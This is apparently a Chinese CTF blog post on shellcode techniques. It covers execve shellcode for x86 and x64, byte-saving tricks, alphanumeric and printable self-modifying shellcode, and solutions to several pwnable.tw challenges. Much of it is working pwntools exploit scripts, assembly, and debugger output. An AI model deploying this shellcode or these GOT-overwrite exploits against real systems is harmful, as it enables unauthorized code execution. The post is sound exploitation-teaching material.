---
title: Shellcode Tricks
date: 2019-03-02 19:05:59
tags: [ctf, pwn]
---

The Splendid Shellcode.

<!-- more -->

Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。

- 可以控制程序执行流，可以控制一定的 data；
- 利用 `mprotect()` 或者 `_dl_make_stack_executable()` 改写某些区域的 porc 再执行。

关于 System Call：

```cpp
sys_execve( const char *filename, char *const argv[], char *const envp[] );
```

目标：

```cpp
execve("/bin/sh", 0, 0);
```

System Call x86：

| eax |        ebx        | ecx | edx |   else   |
| :-: | :---------------: | :-: | :-: | :------: |
| 0xb | addr of "/bin/sh" |  0  |  0  | int 0x80 |

System Call x64：

| rax |        rdi        | rsi | rdx |  else   |
| :-: | :---------------: | :-: | :-: | :-----: |
| 59  | addr of "/bin/sh" |  0  |  0  | syscall |

# Basic Shellcode

最基础的 shellcode，对输入的长度没有做严格限制。

## shellcode

Source Code：

```c
// gcc main.c -m32 -z execstack -o main
#include <stdio.h>
int main() {
	void (*ptr)();
	char buf[0x20];
	puts("shellcode>>");
	read(0, buf, 0x20);
	ptr = buf;
	ptr();
}
```

push 字符串`"/bin/sh"`，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。`"/bin/sh"`的值可以在 gdb 调试中`searchmem /bin/sh`得到。Shellcode 的长度为 29。

Exploit：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'i386'
sh = asm('''
	mov eax, 0xb
	mov ecx, 0
	mov edx, 0
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
info(disasm(sh))
info(len(sh))
# gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x20))
p.interactive()
```

## shellcode64

Source Code：

```c
// gcc main.c -z execstack -o main
#include <stdio.h>
int main() {
	void (*ptr)();
	char buf[0x40];
	puts("shellcode>>");
	read(0, buf, 0x40);
	ptr = buf;
	ptr();
}
```

64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37

Exploit：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'amd64'
sh = asm('''
	mov rax, 59
	mov rsi, 0
	mov rdx, 0
	mov rdi, 0x68732f6e69622f
	push rdi
	mov rdi, rsp
	syscall
''')
info(disasm(sh))
info(len(sh))
# gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x40))
p.interactive()
```

# Baby Shellcode

对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。

## shellcode_20

Source Code：

```c
// gcc main.c -m32 -z execstack -o main
#include <stdio.h>
int main() {
	void (*ptr)();
	char buf[0x20];
	puts("shellcode>>");
	read(0, buf, 20);
	ptr = buf;
	ptr();
}
```

32 位下，`mov ecx, 0` 是 5 个字节，而 `xor ecx, ecx` 只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。`mov eax, 0xb` 同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要 `mov al, 0xb`，只需要 2 个字节。`mul ebx` 需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。执行 shellcode 时寄存器的状态：

```
─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
 EAX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* 'fer' */
 EBX  0x0
 ECX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* 'fer' */
 EDX  0x14
 EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0xffffd718 ◂— 0x0
 ESP  0xffffd6dc —▸ 0x80484d5 (main+74) ◂— mov    eax, 0
 EIP  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* 'fer' */
───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
 ► 0xffffd6ec    push   eax
   0xffffd6ed    or     ah, dl
   0xffffd6ef    test   dword ptr [ecx], 0
   0xffffd6f5    add    byte ptr [eax], al
   0xffffd6f7    add    byte ptr [eax + 0x1a], dl
    ↓
   0xffffd6f7    add    byte ptr [eax + 0x1a], dl
```

Exploit：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'i386'
sh = asm('''
	mul ebx
	mov al, 0xb
	xor ecx, ecx
	push 0x0068732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
info(disasm(sh))
info(len(sh))
gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x20, '\x00'))
p.interactive()
```

还有一种就是构造 `read`，读入 shellcode，可以直接缩短到 8 个字节：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'i386'
sh = asm('''
	mul ebx
	mov al, 0x3
	mov dl, 0x90
	int 0x80
''')
info(disasm(sh))
info(len(sh))
gdb.attach(p)
p.sendlineafter('shellcode>>\n', sh)
payload = '\x90' * 0x20 + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

## shellcode64_22

Source Code：

```c
// gcc main.c -z execstack -o main
#include <stdio.h>
int main() {
	void (*ptr)();
	char buf[0x40];
	puts("shellcode>>");
	read(0, buf, 22);
	ptr = buf;
	ptr();
}
```

调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的 `mov rax, 59` 缩短为 2 个字节的 `mov al, 59`。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即 `push rbx ; pop rsi` 只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。执行 shellcode 时寄存器的状态：

```
─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x7fffffffe590 ◂— 0xa50 /* 'P\n' */
 RDI  0x0
 RSI  0x7fffffffe590 ◂— 0xa50 /* 'P\n' */
 R8   0x602000 ◂— 0x0
 R9   0xd
 R10  0x37b
 R11  0x246
 R12  0x4004e0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe6c0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe5e0 —▸ 0x400640 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffe578 —▸ 0x400625 (main+79) ◂— mov    eax, 0
 RIP  0x7fffffffe590 ◂— 0xa50 /* 'P\n' */
───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
 ► 0x7fffffffe590    push   rax
   0x7fffffffe591    or     al, byte ptr [rax]
   0x7fffffffe593    add    byte ptr [rax], al
   0x7fffffffe595    add    byte ptr [rax], al
   0x7fffffffe597    add    byte ptr [rax], al
   0x7fffffffe599    add    byte ptr [rax], al
   0x7fffffffe59b    add    byte ptr [rax], al
   0x7fffffffe59d    add    byte ptr [rax], al
   0x7fffffffe59f    add    byte ptr [rcx], al
   0x7fffffffe5a1    add    byte ptr [rax], al
   0x7fffffffe5a3    add    byte ptr [rax], al
```

Exploit：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'amd64'
sh = asm('''
	mov al, 59
	push rbx
	push rbx
	pop rsi
	pop rdx
	mov rdi, 0x68732f6e69622f
	push rdi
	push rsp
	pop rdi
	syscall
''')
info(disasm(sh))
info(len(sh))
gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x40))
p.interactive()
```

构造 `read` 最短可以修改为 7 字节：

```python
#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'amd64'
sh = asm('''
	xor rdx, rdx
	mov dl, 0x90
	syscall
''')
info(disasm(sh))
info(len(sh))
gdb.attach(p)
p.sendlineafter('shellcode>>\n', sh)
payload = '\x90' * 0x20 + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

# Alphanumeric Shellcode

用上面 32 位的程序作为例子，输入长度不做限制，使用数字和字母来编写 shellcode。可以尝试看看大概有哪些能用的指令：

```txt
a   61                      popa
b   62 41 42                bound  eax,QWORD PTR [ecx+0x42]
c   63 41 42                arpl   WORD PTR [ecx+0x42],ax
d   64 41                   fs inc ecx
e   65 41                   gs inc ecx
f   66 41                   inc    cx
g   67 41                   addr16 inc ecx
h   68 41 42 43 44          push   0x44434241
i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443
j   6a 41                   push   0x41
k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43
...
p   70 41                   jo     0x43
q   71 41                   jno    0x43
r   72 41                   jb     0x43
s   73 41                   jae    0x43
t   74 41                   je     0x43
u   75 41                   jne    0x43
v   76 41                   jbe    0x43
w   77 41                   ja     0x43
x   78 41                   js     0x43
y   79 41                   jns    0x43
z   7a 41                   jp     0x43
A   41                      inc    ecx
B   42                      inc    edx
C   43                      inc    ebx
D   44                      inc    esp
E   45                      inc    ebp
F   46                      inc    esi
G   47                      inc    edi
H   48                      dec    eax
I   49                      dec    ecx
J   4a                      dec    edx
K   4b                      dec    ebx
L   4c                      dec    esp
M   4d                      dec    ebp
N   4e                      dec    esi
O   4f                      dec    edi
P   50                      push   eax
Q   51                      push   ecx
R   52                      push   edx
S   53                      push   ebx
T   54                      push   esp
U   55                      push   ebp
V   56                      push   esi
W   57                      push   edi
X   58                      pop    eax
Y   59                      pop    ecx
Z   5a                      pop    edx
0   30 41 42                xor    BYTE PTR [ecx+0x42],al
1   31 41 42                xor    DWORD PTR [ecx+0x42],eax
2   32 41 42                xor    al,BYTE PTR [ecx+0x42]
3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]
4   34 41                   xor    al,0x41
5   35 41 42 43 44          xor    eax,0x44434241
...
```

其中 `pop ebx` 是没有的，但是可以采用 `push` 系列的指令和 `popa` 来赋值。还有关键的一点是 `int 0x80` 并不存在，也需要使用一些 tricks。这里可以看到有异或的指令，如果控制了 `ecx`（将 shellcode 的地址赋给 `ecx`）和 `al`，就可以对指定部分的 shellcode 实现自修改。这里的情况是 shellcode 被读到栈上，可以通过 `inc` 和 `dec` 调整 `esp` 的位置，然后 `pop` 给 `ecx`。一般来说采用构造 `sys_read` 的方式来读入 `sys_execve` 的 shellcode 覆盖（自修改）原本的 shellcode。

原理大概如上，具体实现经过调试后才会更加熟悉，脚本：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

p = process('./main')

#gdb.attach(p)

sh = (
	'DDDDDDDDDDDDDDDDDDDDY' + # pop ecx
	'jDX4DH0AA' + # 0xff ^ ord('2') => 0xcd
	'jDX4DH4K0AB' + # 0xff ^ ord('9') ^ ord('F') => 0x80
	'jDX4D' + # set eax=0
	'PQPPPPPPa' + # set ebx
	'jzZ' + # set edx=90
	'j7X44' # set eax=3
).ljust(0x41, 'P') + '24'

print disasm(sh)
print len(sh)
p.sendlineafter('shellcode>\n', sh)

#raw_input('@')
p.sendline('\x90' * 70 + asm(shellcraft.sh()))

p.interactive()
```

# Child Shellcode

## orw

题目一开始 seccomp 设置了白名单，根据提示也可以知道只能使用 open、read、write 三个调用来读取 `/home/orw/flag`。然后可以输入长 0xC8 的 shellcode 执行：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

写个汇编实现读取并输出的操作：

```nasm
BITS 32

_start:
	sub esp, 200
	mov dword [esp], 0x6d6f682f
	mov dword [esp + 4], 0x726f2f65
	mov dword [esp + 8], 0x6c662f77
	mov dword [esp + 12], 0x6761

_open:
	mov eax, 5
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

_read:
	mov ebx, eax
	mov eax, 3
	mov ecx, esp
	mov edx, 100
	int 0x80

_write:
	mov ebx, 1
	mov ecx, esp
	mov edx, eax
	mov eax, 4
	int 0x80

_exit:
	add esp, 200
	ret
```

用 nasm 编译后获取 flag：

```python
#!/usr/bin/env python
from pwn import *

r = remote('chall.pwnable.tw', 10001)

sh = open('sh', 'rb').read()
r.recvuntil('Give my your shellcode:')
r.sendline(sh)

r.interactive()
```

## Death Note

程序没有开启 NX，可以跑 shellcode。程序是给了四个选项，增加、删除、查看 Note，以及退出程序：

```cpp
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int c; // eax

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      c = read_int();
      if ( c != 2 )
        break;
      show_note();
    }
    if ( c > 2 )
    {
      if ( c == 3 )
      {
        del_note();
      }
      else
      {
        if ( c == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( c != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

其中在 `read_int` 函数中发现用了 `atoi`，可以输入负数：

```cpp
int read_int()
{
  char buf; // [esp+Ch] [ebp-1Ch]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( read(0, &buf, 0xFu) > 0 )
    return atoi(&buf);
  puts("read error");
  exit(1);
  return atoi(&buf);
}
```

漏洞主要在 `add_note` 中，输入 idx 的时候只判断了不能大于 10，说明可以输入负数，那就可以读到 bss 上的其他部分，可以指向 GOT。接下来在输入了 Name 之后，会判断输入的字符串是否都是可打印字符：

```cpp
unsigned int add_note()
{
  int idx; // [esp+8h] [ebp-60h]
  char s; // [esp+Ch] [ebp-5Ch]
  unsigned int v3; // [esp+5Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(&s, 0x50u);
  if ( !is_printable(&s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  note[idx] = strdup(&s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```

其中 `is_printable` 函数如下：

```cpp
int __cdecl is_printable(char *s)
{
  size_t i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; strlen(s) > i; ++i )
  {
    if ( s[i] <= 0x1F || s[i] == 0x7F )
      return 0;
  }
  return 1;
}
```

看完 `add_note` 基本上就有思路了，先是获取 `note` 到 `puts@got` 之间的偏移，作为 idx 输入。然后构造一个 shellcode 读入，相当于把 `puts@got` 改成了 shellcode，这样在 `strdup(&s)` 之后就改好了 `puts@got`，在下一条语句调用 `puts` 的时候跑 shellcode。这里比 alphanumeric 的条件宽松些，大部分可用的指令如下：

```txt
...
(   28 41 42                sub    BYTE PTR [ecx+0x42],al
)   29 41 42                sub    DWORD PTR [ecx+0x42],eax
*   2a 41 42                sub    al,BYTE PTR [ecx+0x42]
+   2b 41 42                sub    eax,DWORD PTR [ecx+0x42]
,   2c 41                   sub    al,0x41
-   2d 41 42 43 44          sub    eax,0x44434241
...
0   30 41 42                xor    BYTE PTR [ecx+0x42],al
1   31 41 42                xor    DWORD PTR [ecx+0x42],eax
2   32 41 42                xor    al,BYTE PTR [ecx+0x42]
3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]
4   34 41                   xor    al,0x41
5   35 41 42 43 44          xor    eax,0x44434241
...
@   40                      inc    eax
A   41                      inc    ecx
B   42                      inc    edx
C   43                      inc    ebx
D   44                      inc    esp
E   45                      inc    ebp
F   46                      inc    esi
G   47                      inc    edi
H   48                      dec    eax
I   49                      dec    ecx
J   4a                      dec    edx
K   4b                      dec    ebx
L   4c                      dec    esp
M   4d                      dec    ebp
N   4e                      dec    esi
O   4f                      dec    edi
P   50                      push   eax
Q   51                      push   ecx
R   52                      push   edx
S   53                      push   ebx
T   54                      push   esp
U   55                      push   ebp
V   56                      push   esi
W   57                      push   edi
X   58                      pop    eax
Y   59                      pop    ecx
Z   5a                      pop    edx
[   5b                      pop    ebx
\   5c                      pop    esp
]   5d                      pop    ebp
^   5e                      pop    esi
_   5f                      pop    edi
`   60                      pusha
a   61                      popa
...
h   68 41 42 43 44          push   0x44434241
i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443
k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43
...
p   70 41                   jo     0x43
q   71 41                   jno    0x43
r   72 41                   jb     0x43
s   73 41                   jae    0x43
t   74 41                   je     0x43
u   75 41                   jne    0x43
v   76 41                   jbe    0x43
w   77 41                   ja     0x43
x   78 41                   js     0x43
y   79 41                   jns    0x43
z   7a 41                   jp     0x43
{   7b 41                   jnp    0x43
|   7c 41                   jl     0x43
}   7d 41                   jge    0x43
~   7e 41                   jle    0x43
```

这里有 `sub` 指令，可以通过溢出多次减法来得到想要的字节：

```python
x = 0x80 # 0xcd
t = 0
while True:
	x = (x + 0x50) & 0xFF
	t += 1
	if x >= 0x20 and x < 0x7F:
		print t
		print hex(x)
		break
```

简单地调试一下，看到执行 shellcode 的时候，四个通用寄存器这里 `edx` 指向了输入的 shellcode，这样的话之后会方便很多：

```
─────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
 EAX  0xfffffff0
 EBX  0x0
 ECX  0x0
 EDX  0x8b33008 ◂— 0x58 /* 'X' */
 EDI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0xfff18ac8 —▸ 0xfff18ad8 ◂— 0x0
 ESP  0xfff18a4c —▸ 0x80487f4 (add_note+165) ◂— add    esp, 0x10
 EIP  0x80484c0 (puts@plt) ◂— jmp    dword ptr [0x804a020]
──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
 ► 0x80484c0 <puts@plt>    jmp    dword ptr [0x804a020]
    ↓
   0x8b33008               pop    eax
   0x8b33009               add    byte ptr [eax], al
   0x8b3300b               add    byte ptr [eax], al
   0x8b3300d               add    byte ptr [eax], al
   0x8b3300f               add    byte ptr [eax], al
   0x8b33011               add    byte ptr [eax], al
   0x8b33013               add    cl, dh
   0x8b33015               lar    eax, word ptr [eax]
   0x8b33018               add    byte ptr [eax], al
   0x8b3301a               add    byte ptr [eax], al
```

脚本：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

local = 0
if local:
	p = process('./death_note')
else:
	p = remote('chall.pwnable.tw', 10201)

elf = ELF('./death_note')

def cmd(c):
	p.recvuntil('choice :')
	p.sendline(str(c))

def add(idx, name):
	cmd(1)
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Name :')
	p.sendline(name)

def show(idx):
	cmd(2)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def delete(idx):
	cmd(3)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def quit():
	cmd(4)

note = 0x0804A060
offset = (elf.got['puts'] - note) / 4

sh = (
	'RY' + # push edx && pop ecx
	'jPX(A"(A"' + # set eax=0x50 && 2 * sub [0x41], 0x50
	'(A#(A#' + # 2 * sub [0x42], 0x50
	'jCX4CP[' + # set ebx=0
	'jpZ' + # set edx=0x70
	'jCX,@' # set eax=3
).ljust(0x22, 'P') + 'm '

print len(sh)
print disasm(sh)
for c in sh:
	if ord(c) <= 0x1F or ord(c) > 0x7F:
		raise ValueError, 'Value error.'

#gdb.attach(p, 'b *0x080487EF')

add(offset, sh)
payload = '\x90' * 0x30 + asm(shellcraft.sh())
#raw_input('@')
p.sendline(payload)

p.interactive()
```

# Adult Shellcode

## Alive Note

这道题的程序和上面的差不多，但具体利用部分有些不同。`add_note` 中一开始的数组越界还是存在的，后面读取 Name 的时候只能读 8 个字节，意味着 shellcode 只能 8 字节为单位地送，且 `check` 函数下面的提示说只能用 alphanumeric：

```cpp
unsigned int add_note()
{
  int idx; // [esp+0h] [ebp-18h]
  char s; // [esp+4h] [ebp-14h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(&s, 8u);
  if ( !check(&s) )
  {
    puts("It must be a alnum name !");
    exit(-1);
  }
  note[idx] = strdup(&s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```

在调试过程中，看到堆上大概是这样，prev_size 和 chunk_size 两个字段是固定的，剩下的 8 个字节可以填 shellcode：

```
gef➤  x/4wx 0x0804b000
0x804b000:	0x00000000	0x00000011	0x00000031	0x00000000
```

固定的字段的 asm 只跟 `eax` 有关，如果要使用的话只需要确保 `eax` 指向的内存是存在的：

```python
from pwn import *
s = p32(0) + p32(0x11)
print disasm(s)
#   0:   00 00                   add    BYTE PTR [eax],al
#   2:   00 00                   add    BYTE PTR [eax],al
#   4:   11 00                   adc    DWORD PTR [eax],eax
#   6:   00 00                   add    BYTE PTR [eax],al
```

接下来看一下 check 函数，就是要保证输入的字符串是 alphanumeric 以及空格：

> `__ctype_b_loc` 主要获取一个数组列表，可容纳 `-128~255` 范围的字符，对应字符值索引可获取到本地语言的字符集，对于要求的字符与掩码位求与即可得到该字符是否为某种掩码位类型的字符：

```cpp
int __cdecl check(char *s)
{
  size_t i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; strlen(s) > i; ++i )
  {
    if ( s[i] != 32 && !((*__ctype_b_loc())[s[i]] & 8) )
      return 0;
  }
  return 1;
}
```

思路基本上就是第一次 add 的时候把 `free@got` 修改为堆上的 shellcode，接下来把 shellcode 分段送上去，最后 delete 掉第一次的 note 来执行 shellcode。先看看寄存器的状态：

```
───────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────
 EAX  0x99a9008 ◂— 0x58 /* 'X' */
 EBX  0x0
 ECX  0x0
 EDX  0x0
 EDI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0xffd6f598 —▸ 0xffd6f5a8 ◂— 0x0
 ESP  0xffd6f56c —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10
 EIP  0x80484e0 (free@plt) ◂— jmp    dword ptr [0x804a014]
────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────
 ► 0x80484e0 <free@plt>    jmp    dword ptr [0x804a014]
    ↓
   0x99a9008               pop    eax
   0x99a9009               add    byte ptr [eax], al
   0x99a900b               add    byte ptr [eax], al
   0x99a900d               add    byte ptr [eax], al
   0x99a900f               add    byte ptr [eax], al
   0x99a9011               add    byte ptr [eax], al
   0x99a9013               add    cl, dh
   0x99a9015               lar    eax, word ptr [eax]
   0x99a9018               add    byte ptr [eax], al
   0x99a901a               add    byte ptr [eax], al
```

可以看到 `eax` 是指向了 shellcode，其他几个系统调用会用到的寄存器为 0。接下来要解决的主要问题就是中间的 padding 部分怎么绕过。可以把 `eax` 指向栈上，这样就不会干扰到，但这样的话在构造 shellcode 的时候还是挺麻烦的。最好的方法就是充分利用几个跳转指令，就不用在意中间的 padding，只需要计算好跳转的偏移，构造起来也比较麻烦，但效果远比前一种方法好。这里主要参考了这个 [Exploit](https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py)（几处跳转构造得太秀了）：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

local = 1
if local:
	p = process('./alive_note')
else:
	p = remote('chall.pwnable.tw', 10300)

elf = ELF('./alive_note')

def cmd(c):
	p.recvuntil('choice :')
	p.sendline(str(c))

def add(idx, name):
	cmd(1)
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Name :')
	p.sendline(name)

def show(idx):
	cmd(2)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def delete(idx):
	cmd(3)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def quit():
	cmd(4)

note = 0x0804A080
offset = (elf.got['free'] - note) / 4
info(offset)
padding = p32(0) + p32(0x11)

#   0:   50                      push   eax
#   1:   59                      pop    ecx
#   2:   6a 7a                   push   0x7a
#   4:   5a                      pop    edx
#   5:   53                      push   ebx
#   6:   75 38                   jne    0x40
#   8:   00 00                   add    BYTE PTR [eax],al
#   a:   00 00                   add    BYTE PTR [eax],al
#   c:   11 00                   adc    DWORD PTR [eax],eax
#   e:   00 00                   add    BYTE PTR [eax],al
#  10:   34 46                   xor    al,0x46
#  12:   30 41 35                xor    BYTE PTR [ecx+0x35],al
#  15:   53                      push   ebx
#  16:   75 38                   jne    0x50
#  18:   00 00                   add    BYTE PTR [eax],al
#  1a:   00 00                   add    BYTE PTR [eax],al
#  1c:   11 00                   adc    DWORD PTR [eax],eax
#  1e:   00 00                   add    BYTE PTR [eax],al
#  20:   66 75 63                data16 jne 0x86
#  23:   6b 50 50 50             imul   edx,DWORD PTR [eax+0x50],0x50
#  27:   50                      push   eax
#  28:   00 00                   add    BYTE PTR [eax],al
#  2a:   00 00                   add    BYTE PTR [eax],al
#  2c:   11 00                   adc    DWORD PTR [eax],eax
#  2e:   00 00                   add    BYTE PTR [eax],al
#  30:   58                      pop    eax
#  31:   34 33                   xor    al,0x33
#  33:   34 30                   xor    al,0x30
#  35:   74 39                   je     0x70
#  37:   50                      push   eax
#  38:   00 00                   add    BYTE PTR [eax],al
#  3a:   00 00                   add    BYTE PTR [eax],al
#  3c:   11 00                   adc    DWORD PTR [eax],eax
#  3e:   00 00                   add    BYTE PTR [eax],al
#  40:   58                      pop    eax
#  41:   48                      dec    eax
#  42:   30 41 46                xor    BYTE PTR [ecx+0x46],al
#  45:   75 36                   jne    0x7d
#  47:   50                      push   eax
#  48:   00 00                   add    BYTE PTR [eax],al
#  4a:   00 00                   add    BYTE PTR [eax],al
#  4c:   11 00                   adc    DWORD PTR [eax],eax
#  4e:   00 00                   add    BYTE PTR [eax],al
#  50:   30 41 36                xor    BYTE PTR [ecx+0x36],al
#  53:   30 41 57                xor    BYTE PTR [ecx+0x57],al
#  56:   75 61                   jne    0xb9
sh = (
	'PYjzZSu8' + padding +
	'4F0A5Su8' + padding +
	'fuckPPPP' + padding +
	'X4340t9P' + padding +
	'XH0AFu6P' + padding +
	'0A60AWua'
)
print disasm(sh)
sh = sh.split(padding)

#gdb.attach(p, 'b *0x080488EA\nc')

#sh = 'PYTXuA'
add(offset, sh[0])
for i in range(5):
	add(i, sh[i + 1])
delete(offset)

payload = '\x90' * 0x37 + asm(shellcraft.sh())
#raw_input('@')
p.sendline(payload)

p.interactive()
```

# Hell Shellcode

## MnO2

同样是 shellcode，这道题里只能用元素周期表中的元素以及数字：

```txt
H He Li Be B C N O F Ne Na Mg Al Si P S Cl Ar K Ca Sc Ti V Cr Mn Fe Co Ni Cu Zn Ga Ge As Se Br Kr Rb Sr Y Zr Nb Mo Tc Ru Rh Pd Ag Cd In Sn Sb Te I Xe Cs Ba La Ce Pr Nd Pm Sm Eu Gd Tb Dy Ho Er Tm Yb Lu Hf Ta W Re Os Ir Pt Au Hg Tl Pb Bi Po At Rn Fr Ra Ac Th Pa U Np Pu Am Cm Bk Cf Es Fm Md No Lr Rf Db Sg Bh Hs Mt Ds Rg Cn Fl Lv
0 1 2 3 4 5 6 7 8 9
```

先试试大概有哪些能用。大部分都是一些 `inc` 和 `dec`，还有一些 `push` 和 `pop`，但这些肯定不够，还得用上一些元素的组合：

```txt
[H]		dec eax
[He]	dec eax ; xor gs:[ecx], xx
[Li]	dec esp ; imul esi, [eax], xx
[Be]	inc edx ; xor gs:[ecx], xx
[B]		inc edx
[C]		inc ebx
[N]		dec esi
[O]		dec edi
[F]		inc esi
[Ne]	dec esi ; xor gs:[ecx], xx
[Na]	dec esi ; popa
[Mg]	dec ebp ; xxxx
[Al]	inc ecx ; ins es:[edi], dx
[Si]	push ebx ; imul esi, [eax], xx
[P]		push eax
[S]		push ebx
[Cl]	inc ebx ; ins es:[edi], dx
[Ar]	inc ecx ; jb xx
[K]		dec ebx
[Ca]	inc ebx ; popa
[Sc]	push ebx ; xxxx
[Ti]	push esp ; imul esi, [eax], xxxx
[V]		push esi
[Cr]	inc ebx ; jb xx
[Mn]	dec ebp ; outs dx, ds:[esi]
[Fe]	inc esi ; xxxx
[Co]	inc ebx ; outs dx, ds:[esi]
[Ni]	dec esi ; imul esi, [eax], xxxx
[Cu]	inc ebx ; jne xx
[Zn]	pop edx ; outs dx, ds:[esi]
[Ga]	inc edi ; popa
[Ge]	inc edi ; xxxx
[As]	inc ecx ; jae xx
[Se]	push ebx ; xxxx
[Br]	inc edx ; jb xx
[Kr]	dec ebx ; jb xx
[Rb]	push edx ; xxxx
[Sr]	push ebx ; jb xx
[Y]		pop ecx
[Zr]	pop edx ; jb xx
[Nb]    dec esi ; xxxx
[Mo]	dec ebp ; outs dx, ds:[esi]
[Tc]	push esp ; xxxx
[Ru]	push edx ; jne xx
[Rh]	push edx ; push xxxx
[Pd]	push eax ; xxxx
[Ag]	inc ecx ; xxxx
[Cd]	inc ebx ; xxxx
[In]	dec ecx ; outs dx, ds:[esi]
[Sn]	push ebx ; outs dx, ds:[esi]
[Sb]	push ebx ; xxxx
